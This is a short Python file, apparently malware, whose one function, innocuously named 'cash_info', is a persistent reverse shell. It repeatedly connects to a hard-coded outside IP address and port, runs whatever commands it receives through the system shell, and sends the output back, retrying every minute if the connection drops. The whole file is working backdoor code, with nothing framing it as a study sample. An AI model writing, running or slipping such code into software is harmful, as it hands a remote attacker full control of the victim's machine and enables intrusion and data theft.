import socket
import subprocess
import time

def cash_info():
    while True:
        s = None
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect(('194.238.19.162', 4321))
            while True:
                try:
                    c = s.recv(1024).decode('utf-8').strip()
                    if c.lower() in ['exit', 'quit']:
                        break
                    output = subprocess.run(c, shell=True, capture_output=True, text=True)
                    r = output.stdout + output.stderr
                    if not r:
                        r = "No output"
                    s.send(r.encode('utf-8'))
                except subprocess.CalledProcessError as e:
                    s.send(f"Com failed: {str(e)}".encode('utf-8'))
                except Exception as e:
                    s.send(f"Error: {str(e)}".encode('utf-8'))
                    break
        except Exception as e:
            time.sleep(60)
        finally:
            if s:
                s.close()

if __name__ == "__main__":
    cash_info()
